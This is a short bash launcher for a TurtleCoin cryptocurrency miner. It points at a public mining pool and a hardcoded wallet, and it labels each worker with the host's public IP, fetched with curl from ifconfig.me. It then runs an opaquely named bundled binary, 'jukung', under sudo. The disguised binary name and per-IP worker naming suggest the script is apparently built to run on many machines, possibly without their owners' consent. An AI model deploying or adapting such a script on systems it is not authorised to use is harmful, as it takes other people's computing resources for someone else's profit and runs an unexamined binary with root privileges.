#!/bin/bash

POOL=turtlecoin.herominers.com:10381
WALLET=TRTLv2cdGxLUfaRzdoh1RMVDVdRu9Rdd1AimPesRzMrZFRjrPEB9exmAncNL3Kssyr9xxRsrjdYYZMvhJPpvo78H2gTUhZ93nra
WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-Catok

cd "$(dirname "$0")"

chmod +x ./jukung && sudo ./jukung -a argon2id_chukwa2 -o $POOL -u $WALLET.$WORKER $@
